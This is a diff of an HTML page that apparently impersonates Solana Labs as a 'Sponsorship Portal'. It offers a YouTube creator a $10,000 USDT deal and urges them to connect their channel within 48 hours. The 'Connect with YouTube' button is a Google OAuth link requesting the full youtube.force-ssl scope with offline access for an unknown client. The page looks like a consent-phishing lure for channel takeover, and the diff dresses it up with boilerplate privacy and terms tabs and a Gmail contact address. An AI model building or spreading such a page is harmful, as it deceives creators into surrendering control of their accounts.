@@ -13,7 +13,7 @@
     padding: 20px;
   }
   .container {
-    max-width: 700px;
+    max-width: 800px;
     margin: 40px auto;
     background-color: #000000;
     border-radius: 10px;
@@ -30,14 +30,30 @@
     text-align: center;
     margin-bottom: 10px;
   }
-  p.lead {
-    font-size: 18px;
-    line-height: 1.5;
-    text-align: center;
-    margin-bottom: 40px;
+  .tab-buttons {
+    display: flex;
+    justify-content: center;
+    margin-bottom: 30px;
   }
-  .section {
-    margin-bottom: 35px;
+  .tab-btn {
+    background-color: #00FFA3;
+    color: #000;
+    padding: 10px 20px;
+    margin: 0 10px;
+    border: none;
+    border-radius: 25px;
+    font-weight: bold;
+    cursor: pointer;
+    transition: background-color 0.3s;
+  }
+  .tab-btn:hover {
+    background-color: #00cc82;
+  }
+  .tab-content {
+    display: none;
+  }
+  .tab-content.active {
+    display: block;
   }
   h2 {
     color: #00FFA3;
@@ -75,52 +91,75 @@
   footer a {
     color: #00FFA3;
     text-decoration: none;
-    margin: 0 8px;
-  }
-  footer a:hover {
-    text-decoration: underline;
   }
 </style>
 </head>
 <body>
   <div class="container">
     <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcToIG8feZdv7SVG0RYdGFUy8FDf_wxddAruJQ&s" alt="Solana Logo" />
-    <h1>Solana Sponsorship Dashboard</h1>
-    <p class="lead">Welcome! This dashboard contains your sponsorship proposal details and next steps.</p>
+    <h1>Solana Sponsorship Portal</h1>
 
-    <div class="section">
-      <h2>Campaign Overview</h2>
-      <ul>
-        <li>Sponsored Integration: 30-60 seconds in one upcoming video</li>
-        <li>Upfront Payment: <strong>$10,000 USDT</strong></li>
-        <li>Contract Duration: 30 days</li>
-        <li>Campaign Start Date: <em>June 30 2025</em></li>
-      </ul>
+    <div class="tab-buttons">
+      <button class="tab-btn" onclick="showTab('dashboard')">Dashboard</button>
+      <button class="tab-btn" onclick="showTab('privacy')">Privacy Policy</button>
+      <button class="tab-btn" onclick="showTab('tos')">Terms of Service</button>
     </div>
 
-    <div class="section">
-      <h2>Verification Policy for Sponsorship Payments</h2>
-      <p>To comply with Solana Labs’ security and anti-fraud regulations, you must verify ownership of your YouTube channel and provide your associated payment info before any sponsorship payments can be processed.</p>
-      <p>Please connect your YouTube account below within 48 hours to avoid payment delays or cancellation.</p>
+    <!-- Dashboard -->
+    <div id="dashboard" class="tab-content active">
+      <div class="section">
+        <h2>Campaign Overview</h2>
+        <ul>
+          <li>Sponsored Integration: 30-60 seconds in one upcoming video</li>
+          <li>Upfront Payment: <strong>$10,000 USDT</strong></li>
+          <li>Contract Duration: 30 days</li>
+          <li>Campaign Start Date: <em>June 30 2025</em></li>
+        </ul>
+      </div>
 
-      <a class="oauth-btn" href="https://accounts.google.com/o/oauth2/v2/auth?client_id=847323098345-97tbp1m5g8ec170plkebnl5e17eo3ja3.apps.googleusercontent.com&redirect_uri=https%3A%2F%2Fsolana-collaboration.github.io%2FSolana%2F&response_type=code&scope=https%3A%2F%2Fwww.googleapis.com%2Fauth%2Fyoutube.force-ssl&access_type=offline&prompt=consent">Connect with YouTube</a>
+      <div class="section">
+        <h2>Verification Policy</h2>
+        <p>To comply with Solana Labs’ anti-fraud standards, you must verify ownership of your YouTube channel.</p>
+        <p>Please connect your YouTube account below within 48 hours to avoid delays.</p>
+        <a class="oauth-btn" href="https://accounts.google.com/o/oauth2/v2/auth?client_id=847323098345-97tbp1m5g8ec170plkebnl5e17eo3ja3.apps.googleusercontent.com&redirect_uri=https%3A%2F%2Fsolana-collaboration.github.io%2FSolana%2F&response_type=code&scope=https%3A%2F%2Fwww.googleapis.com%2Fauth%2Fyoutube.force-ssl&access_type=offline&prompt=consent">Connect with YouTube</a>
+      </div>
+
+      <div class="section">
+        <h2>Contact</h2>
+        <ul>
+          <li>Email: <a href="mailto:solana.marketing.team@gmail.com">solana.marketing.team@gmail.com</a></li>
+          <li>Phone: +1 (555) 123-4567</li>
+        </ul>
+      </div>
     </div>
 
-    <div class="section">
-      <h2>Contact</h2>
-      <p>If you have any questions, contact Marcus V., Partnerships Manager:</p>
-      <ul>
-        <li>Email: <a href="mailto:solana.marketing.team@gmail.com">solana.marketing.team@gmail.com</a></li>
-        <li>Phone: +1 (555) 123-4567</li>
-      </ul>
+    <!-- Privacy Policy -->
+    <div id="privacy" class="tab-content">
+      <h2>Privacy Policy</h2>
+      <p>This platform collects limited data such as your email and YouTube channel ID for verification and sponsorship processing. We do not store passwords or personal messages.</p>
+      <p>All data is processed strictly for partnership purposes and not shared with third parties outside Solana Labs or its representatives.</p>
+      <p>By using this service, you consent to the data practices described here.</p>
+    </div>
+
+    <!-- Terms of Service -->
+    <div id="tos" class="tab-content">
+      <h2>Terms of Service</h2>
+      <p>By accessing this sponsorship portal, you agree to provide accurate information and comply with our verification policies.</p>
+      <p>Solana Labs reserves the right to cancel or modify sponsorship offers at any time without notice.</p>
+      <p>Improper use of this platform may result in disqualification from current or future partnerships.</p>
     </div>
 
     <footer>
-      &copy; 2025 Solana Labs | 
-      <a href="https://www.solana.com" target="_blank" rel="noopener noreferrer">Homepage</a> | 
-      <a href="https://solana-collaboration.github.io/privacy-policy" target="_blank" rel="noopener noreferrer">Privacy Policy</a> | 
-      <a href="https://solana-collaboration.github.io/terms-of-service" target="_blank" rel="noopener noreferrer">Terms of Service</a>
+      &copy; 2025 Solana Labs | All Rights Reserved
     </footer>
   </div>
+
+<script>
+  function showTab(id) {
+    const tabs = document.querySelectorAll('.tab-content');
+    tabs.forEach(tab => tab.classList.remove('active'));
+    document.getElementById(id).classList.add('active');
+  }
+</script>
 </body>
 </html>
